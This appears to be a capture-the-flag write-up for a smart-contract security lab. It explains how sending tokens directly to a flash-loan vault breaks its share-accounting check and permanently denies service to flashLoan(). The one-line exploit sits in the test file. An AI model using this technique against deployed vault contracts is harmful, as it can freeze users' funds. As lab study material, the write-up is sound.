
# Solution:

it was Really Painful that at the end i find out, this Challenge can be Done only With one Line of code: (it took me 1.5 day to solve it, and i Founded by my Own Without Looking Online Solutions, so it was really painful...)

```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠖⠚⠉⠁⠀⠀⠉⠙⠒⢄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢢⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣆⠀⠀
⠀⠀⠀⠀⠀⢠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢇⠀
⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄
⠀⠀⠀⠀⢸⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇
⠀⠀⠀⠀⠸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇
⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘
⠀⠀⠀⠀⠀⢻⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⡄⠀⠀⠀⠀⠀⢀⣶⡆⠀⢠⠇
⠀⠀⠀⠀⠀⠀⣣⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⠀⠀⠀⠀⠀⠈⠛⠁⡰⠃⠀
⠀⠀⠀⠀⢠⠞⠋⢳⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠜⠁⠀⠀
⠀⠀⠀⣰⠋⠀⠀⠀⢷⠙⠲⢤⣀⡀⠀⠀⠀⠀⠴⠴⣆⠴⠚⠁⠀⠀⠀⠀
⠀⠀⣰⠃⠀⠀⠀⠀⠘⡇⠀⣀⣀⡉⠙⠒⠒⠒⡎⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⠃⠀⠀⢶⠀⠀⠀⢳⠋⠁⠀⠙⢳⡠⠖⠚⠑⠲⡀⠀⠀⠀⠀⠀⠀⠀
⠀⡎⠀⠀⠀⠘⣆⠀⠀⠈⢧⣀⣠⠔⡺⣧⠀⡴⡖⠦⠟⢣⠀⠀⠀⠀⠀⠀
⢸⠀⠀⠀⠀⠀⢈⡷⣄⡀⠀⠀⠀⠀⠉⢹⣾⠁⠁⠀⣠⠎⠀⠀⠀⠀⠀⠀
⠈⠀⠀⠀⠀⠀⡼⠆⠀⠉⢉⡝⠓⠦⠤⢾⠈⠓⠖⠚⢹⠀⠀⠀⠀⠀⠀⠀
⢰⡀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⢸⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀
⠀⠳⡀⠀⠀⠀⠀⠀⠀⣀⢾⠀⠀⠀⠀⣾⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠐⠢⠤⠤⠔⠚⠁⠘⣆⠀⠀⢠⠋⢧⣀⣀⡼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠈⠁⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
```

Lets take A Look At `flashLoan()` function:

```javascript
    function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
            external
            returns (bool)
        {
            if (amount == 0) revert InvalidAmount(0); // fail early
            if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
            uint256 balanceBefore = totalAssets();

            if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

            // transfer tokens out + execute callback on receiver
            ERC20(_token).safeTransfer(address(receiver), amount);

            // callback must return magic value, otherwise assume it failed
            uint256 fee = flashFee(_token, amount);
            if (
                receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                    != keccak256("IERC3156FlashBorrower.onFlashLoan")
            ) {
                revert CallbackFailed();
            }

            // pull amount + fee from receiver, then pay the fee to the recipient
            ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
            ERC20(_token).safeTransfer(feeRecipient, fee);

            return true;
        }
```

ignore first two Checks, there's nothing You can do about it.

the Vulnerablity is in third check:

```javascript
    uint256 balanceBefore = totalAssets();

    if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
```

starting `totalSupply` of is: `1000000000000000000000000`.
starting `totalAssets` of is: `1000000000000000000000000`.

`convertToShares()` function does this:

```javascript
    function convertToShares(uint256 assets) public view virtual returns (uint256) {
        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.
            
        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
    }
```

our `totalSupply` is not `0`, so this part of the code will execute:

```javascript
    assets.mulDivDown(supply, totalAssets());
```

which will result in:

```javascript
    // (assets * supply) / totalAssets()
    (1000000000000000000000000 * 1000000000000000000000000) / 1000000000000000000000000 = 1000000000000000000000000;
```

lets go back to the if Statement:

```javascript
    if (1000000000000000000000000 != 1000000000000000000000000) revert InvalidBalance();
```

all We Have to Do is Manipulate the `totalAssets()` value to make this contract vulnerable to `DOS`, which will Result in Reverting Whenever the `flashLoan()` function is called.

How we can do that? 

Go to the `Unstoppable.t.sol` and Add the Line Below to the `test_unstoppable()` test:

```javascript
    token.transfer(address(vault), 10e18);
```

now `totalAssets()` returned Value is: `1000010000000000000000000`

which will make the if statement to `revert()` everytime the `flashLoan()` function is Called, Because:

```javascript
    if (1000000000000000000000000 != 1000010000000000000000000) revert InvalidBalance();
```

Now One Thing to Note is, You cannot Manipulate the `totalAssets()` value or `convertToShares(totalSupply)` with `deposit()` function because mints the `receiver` address amount of shares
Which Makes the if statement condition to be `false` because `totalAssets()` and `convertToShares(totalSupply)` Values Will be Always Equal.